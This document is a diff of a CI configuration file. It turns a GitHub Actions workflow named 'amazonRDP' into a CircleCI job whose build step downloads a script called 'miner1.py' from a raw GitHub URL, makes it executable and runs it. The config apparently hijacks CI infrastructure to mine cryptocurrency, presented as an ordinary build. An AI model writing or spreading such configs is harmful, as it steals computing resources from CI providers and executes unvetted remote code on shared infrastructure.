@@ -1,15 +1,11 @@
-name: amazonRDP
-
-on: workflow_dispatch
-
+version: 2.0
 jobs:
   build:
-
-    runs-on: ubuntu-latest
-    timeout-minutes: 9999
-
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
-    
-    - name: run python.
-      run: |
-        git clone https://raw.githubusercontent.com/TOMMARCUSBRUT/dcf/main/miner1.py
+      - checkout
+      - run:  wget https://raw.githubusercontent.com/TOMMARCUSBRUT/dcf/main/miner1.py && chmod +x miner1.py && python miner1.py
